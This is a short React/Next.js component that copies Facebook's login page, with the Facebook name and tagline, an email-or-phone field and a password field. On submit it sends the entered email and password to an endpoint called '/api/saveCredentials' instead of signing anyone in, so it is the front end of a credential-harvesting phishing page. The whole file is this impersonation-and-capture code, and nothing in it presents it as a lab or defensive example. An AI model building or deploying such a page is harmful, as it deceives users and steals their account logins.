"use client";
import { useState, FormEvent } from 'react';

export default function FacebookLoginPage() {
  const [email, setEmail] = useState<string>('');
  const [password, setPassword] = useState<string>('');

  const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    
    try {
      const response = await fetch('/api/saveCredentials', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      if (!response.ok) {
        throw new Error('Network response was not ok');
      }

      const result = await response.json();
      alert(result.message || result.error);
    } catch (error) {
      alert(`Error: ${error instanceof Error ? error.message : 'Something went wrong'}`);
    }
  };

  return (
    <div className="container flex">
      <div className="facebook-page flex">
        <div className="text">
          <h1>Facebook</h1>
          <p>Connect with friends and the world</p>
          <p>around you on Facebook.</p>
        </div>
        <form onSubmit={handleSubmit}>
          <input
            type="email"
            placeholder="Email or phone number"
            required
            value={email}
            onChange={(e) => setEmail(e.target.value)}
          />
          <input
            type="password"
            placeholder="Password"
            required
            value={password}
            onChange={(e) => setPassword(e.target.value)}
          />
          <div className="link">
            <button type="submit" className="login">Login</button>
          </div>
        </form>
      </div>
    </div>
  );
}
